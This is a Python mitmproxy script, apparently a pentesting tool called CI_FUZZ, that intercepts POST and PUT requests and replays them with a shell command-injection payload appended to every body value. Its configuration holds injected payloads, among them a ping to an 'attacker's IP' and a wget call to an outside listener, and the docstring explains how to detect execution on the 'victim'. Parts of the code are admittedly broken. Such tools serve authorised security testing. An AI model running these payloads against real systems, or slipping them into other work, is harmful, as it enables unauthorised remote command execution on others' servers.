'''
CI_FUZZ     v.2017-Dec-24

   _____ _____    ______             
  / ____|_   _|  |  ____|            
 | |      | |    | |__ _   _ ________
 | |      | |    |  __| | | |_  /_  /
 | |____ _| |_   | |  | |_| |/ / / / 
  \_____|_____|  |_|   \__,_/___/___|
                                     
                                                
                                                
Description:

	This script fuzz's for Command Injection vulnerabilities resulting in remote command execution.  
	Similiar OWASP vulnerablities are explained here --> https://www.owasp.org/index.php/Command_Injection
	The script will attempt to execute OS commands by injecting into every value in the body of a POST/PUT.  
	Detecting execution requires another tool such as listening for web/icmp traffic or watching a directory on the target OS, etc.

	For example, if the script observes a user has performed a single POST with body set to {"webfunction": "settime", "hour": "10", "minute": "00"}
	The script will generate 5 POST's
	1)The original POST (as is)
		{"webfunction": "settime", "hour": "10", "minute": "00"}	
	2)CI injection on 1st value
		{"webfunction": "settime;ping 10.10.10.10", "hour": "10", "minute": "00"}
	3)CI injection on the 2nd value
		 {"webfunction": "settime", "hour": "10;ping 10.10.10.10", "minute": "00"}
	4)CI injection on the 3rd value
		{"webfunction": "settime", "hour": "10", "minute": "00;ping 10.10.10.10"}
	5)A cleanup POST to return variables to the original value
		{"webfunction": "settime", "hour": "10", "minute": "00"}

	If the payload was executed, the attacker would recieve an icmp ping packet. In this example, the web application is vulnerable to command injection/execution via setting the system time.


Prerequisites:

	-mitmproxy 3.0.0+   

        	#"Virtualenv" method to run mitmproxy 3.0.0+ (ie: your distribution does not support 3.0.0+ binaries)
        	git clone https://github.com/mitmproxy/mitmproxy.git

        	#Follow the "Development setup" here -> https://github.com/mitmproxy/mitmproxy (simliar to below)
        	apt-get install python3-venv
        	cd mitmproxy
        	./dev.sh

        	#Confirm mitmproxy version 3.0.0+
        	. venv/bin/activate
        	(venv) root@kali:/usr/local/src/source-install/mitmproxy3# mitmproxy --version
        		Mitmproxy version: 3.0.0 (2.0.0dev0920-0x3c934b1a)
        		Python version: 3.5.4

Installation:

        #Download ci_fuzz.py
        git clone https://github.com/mvdevnull/ci_fuzz.git


Usage Examples:
      
  	*Set variables in the configuration section below
                Change payload
                Change any other variables in Configuration Section
	*Optional - Import ~/.mitmproxy/mitmproxy-ca-cert.p12 Certificate into browser 

        1)*Run mitmweb using the ci_fuzz.py script listening on localhost port 7777
                mitmweb --listen-port 7777 --ssl-insecure -s ./ci_fuzz/ci_fuzz.py

        2)*Run mitmweb using the ci_fuzz.py script same as above and upstream forward to a GUI proxy like Burp on localhost
                mitmweb --listen-port 7777 --ssl-insecure --mode upstream:https://127.0.0.1:8080 -s ./ci_fuzz/ci_fuzz.py
'''

from mitmproxy import http    	#Request/Response intercepting
from mitmproxy import ctx    	#Logging to builtin events
import json      		#For json manipulation
import re			#For regex
from time import sleep		#for delay between replays

##############################################
#BEGIN CONFIGURATION SECTION
#set the Command Injection payload below.  It will be added to each argument's value in the body (ie: ";ping -c 1 10.10.10.10")
payload = ";ping -c 1 -s 92 192.168.1.254"  #Don't forget to listen for pings on attacker's IP!! (ie: tcpdump -i eth0 icmp)
#payload = ";touch /tmp/ci_fuzz.txt"  #Don't forget to watch for new files in the victim's directory!! (ie: watch ls /tmp/ci_fuzz.txt)
#payload = ";wget 10.10.10.10:80/ci_fuzz --no-proxy&"   #Don't forget to setup an http listener on attacker's IP!! (ie: python -m SimpleHTTPServer 80)

#Optional Configuration
cust_header = "CI_FUZZ"       #Custom Header for all modified requests
skip_content = [{"dont_want_to_test": "true"}]   #Content to skip if matches BODY exactly - keep in list format]
skip_keyword = "password"    #a keyword to skip fuzzing if BODY contains that keyword. useful for login/passwords,etc
delay = .1 #set delay in seconds between replays (ie: .1 is 1/10 of a second between each new injection attempt)
method_type = ["POST","PUT"]      #Set what HTTP methods are triggered (ie:  "POST", "PUT", etc..)
#END CONFIGURATION SECTION
##############################################

def modify_list(webapp_content_json_list,flow):    #BROKEN Function
    for vara in webapp_content_json_list:
        for attribute, value in vara.iteritems():
          if isinstance (value, (unicode)):
            value_new = ""
            value_new = str(value)
            value_new += payload
            webapp_content_json_list.remove(vara)
            vara[(attribute)] = value_new
            webapp_content_json_list.append(vara)
            send_modified_request(webapp_content_json_list,flow)
            webapp_content_json_list.remove(vara)
            vara[(attribute)] = value
            webapp_content_json_list.append(vara)
          if isinstance (value, (nonetype, integer, list)):
            pass
          else:
            pass


def modify_dict(webapp_content_json_dict,flow):
    #ctx.log.error("DEBUG11-MODIFY_DICT-CONTINUE-modifing dict")
    for attribute, value in webapp_content_json_dict.items():
        #ctx.log.error("DEBUG12-MODIFY_DICT-Continue-")
        if isinstance (value, (str)):
          value_new = ""
          value_new = str(value)
          value_new += payload
          webapp_content_json_dict[(attribute)] = value_new
          #ctx.log.error("DEBUG13-REQ-does this have message yet?->%s." % (webapp_content_json_dict))
          send_modified_dict_request(webapp_content_json_dict,flow)
          webapp_content_json_dict[(attribute)] = value
        if isinstance (value, (list, dict, bool, type(None), type(int))):    #Removed integer for now
          #ctx.log.error("TODO!!-MODIFY_DICT this is known type, but yet to be functional - list, dict-->%s." % (type(value)))
          pass
        else:
          #ctx.log.error("ERROR/BUG!! - in Modify_DICT this is a value the developer has never seen->%s of type %s." % (value, type(value)))
          pass


def modify_string(webapp_content_str,flow):
    #ctx.log.error("DEBUGX11-MODIFY_STRING-CONTINUE-modifing ")
    webapp_content_str_split = re.split('\&',webapp_content_str)
    #ctx.log.error("DEBUGX12-MODIFY STRING-split is this->%s." % (webapp_content_str_split))
    for att_val in webapp_content_str_split:
        att_val_split = re.split('=',att_val)
        value_new = ""    #are these neeeded?
        value_new = str(att_val_split[1])
        value_new += payload
        att_val_new = str(att_val_split[0])
        att_val_new += "="
        att_val_new += value_new
        webapp_content_str_new = re.sub(str(att_val),str(att_val_new),str(webapp_content_str))
        #ctx.log.error("DEBUGX13-REQ-injected payload->%s." % (webapp_content_str_new))
        send_modified_string_request(webapp_content_str_new,flow)


def try_json(webapp_content):
    try:
        webapp_content_json = json.loads(webapp_content)
        return webapp_content_json
    except json.decoder.JSONDecodeError:
        webapp_content_json = webapp_content.decode("utf-8")
        webapp_content_json = str(webapp_content_json)
        return webapp_content_json


def check_body(webapp_content):
    if re.match('[.*.]', str(webapp_content)):
      #ctx.log.error("BODY is LIST")
      body_type = "list"
      return body_type
    if re.match('.*\=.*.\&.*', str(webapp_content)):
      #ctx.log.error("BODY is STRING")
      body_type = "string"
      return body_type
    else:
      #ctx.log.error("Unrecognized BODY")
      body_type = "unknown"
      return body_type


def request(flow: http.HTTPFlow) -> None:
    #ctx.log.error("DEBUG1-REQ-Continue-a Request")
    if flow.request.method in method_type:
        #ctx.log.error("DEBUG2-REQ-Continue-an HTTP %s." % (str(method_type)))
        if flow.request.content:   #test body has content (not blank)
            webapp_content = flow.request.content
            #ctx.log.error("DEBUG2.1-REQ-We skip these %s." % (skip_content))
            webapp_content_json = try_json(webapp_content)
            if not re.findall(payload,str(webapp_content_json)) and not re.findall(skip_keyword,str(webapp_content_json)):   #make sure 1)payload value or 2)skip_keyword value is NOT found within BODY
                skip_content.append(webapp_content_json)  #adds to skip_content list to not repeat exact body in the future
                body_type = check_body(webapp_content_json) 
                if body_type == "list":  
                    #ctx.log.error("DEBUG3.1-REQ-Continue-is list->%s." % (webapp_content_json))
                    #modify_list(webapp_content_json,flow)
                    ctx.log.error("TODO--need to process LISTS now")
                    send_clean_request(webapp_content,flow)    #Reset values back to original
                if isinstance(webapp_content_json, dict):  #BODY is dict
                    #ctx.log.error("DEBUG3.2-REQ-Continue-is dict ->%s." % (webapp_content_json))
                    modify_dict(webapp_content_json,flow)
                    send_clean_request(webapp_content,flow)    #Reset values back to original
                if body_type == "string":
                    #ctx.log.error("DEBUG3.3-REQ-Continue-is string ->%s." % (webapp_content_json))
                    modify_string(webapp_content_json,flow)
                    send_clean_request(webapp_content,flow)    #Reset values back to original
                if body_type == "unknown":
                    ctx.log.error("DEBUG3.4-REQ-Stopping - unknown body format to CI_FUZZ")
                    pass
                else:
                    #ctx.log.error("DEBUG4- Not going to process this content ->%s." % (webapp_content_json))
                    pass
            else: #payload or skip_keyword found in BODY - skipping
                pass
        else: #BLANK content - skipping
            pass
    else: #Content to be skipped not PUT/POST
        pass


def send_modified_string_request(webapp_content_str,flow):
    #ctx.log.error("DEBUGX21-SEND_MODIFIED-BODY is->%s." % (webapp_content_str))
    f = flow.copy()
    f.request.headers[cust_header] = "true"
    f.request.content = str.encode(webapp_content_str)
    ctx.master.replay_request(f)
    ctx.log.error("DEBUGX22-FINAL-SEND_MODIFIED-sent->%s." % (f.request.content))
    sleep(delay)


def send_modified_dict_request(webapp_content_json_dict,flow):
    #ctx.log.error("DEBUG21-SEND_MODIFIED-BODY is->%s." % (webapp_content_json_dict))
    webapp_content = json.dumps(webapp_content_json_dict)
    f = flow.copy()
    f.request.headers[cust_header] = "true"
    f.request.content = str.encode(webapp_content)
    ctx.master.replay_request(f) 
    ctx.log.error("DEBUG22-FINAL-SEND_MODIFIED-sent->%s." % (f.request.content))
    sleep(delay)

def send_clean_request(webapp_content,flow):
    f = flow.copy()
    f.request.headers[cust_header] = "true"
    ctx.master.replay_request(f)
    ctx.log.error("FUZZING CLEANED up with original BODY")
    sleep(delay)

